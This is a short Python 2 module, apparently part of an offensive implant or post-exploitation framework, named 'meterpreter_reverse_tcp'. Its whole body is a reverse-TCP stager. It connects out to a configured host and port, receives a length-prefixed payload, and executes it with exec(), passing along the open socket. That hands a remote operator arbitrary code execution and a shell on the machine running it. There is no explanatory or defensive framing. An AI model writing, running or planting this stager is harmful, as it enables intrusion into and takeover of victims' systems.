#!/usr/bin/python
import socket,struct
def run(id, *args):
    print "[->] In meterpreter_reverse_tcp module."
    try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect((args[0]['hostname'],args[0]['port']))
        l=struct.unpack('>I',s.recv(4))[0]
        d=s.recv(l)
        while len(d)<l:
            d+=s.recv(l-len(d))
        exec(d,{'s':s})
    except Exception, e:
        print '\t[-] Caught exception: ' + str(e)
        try:
            s.close()
        except: 
            pass
    return None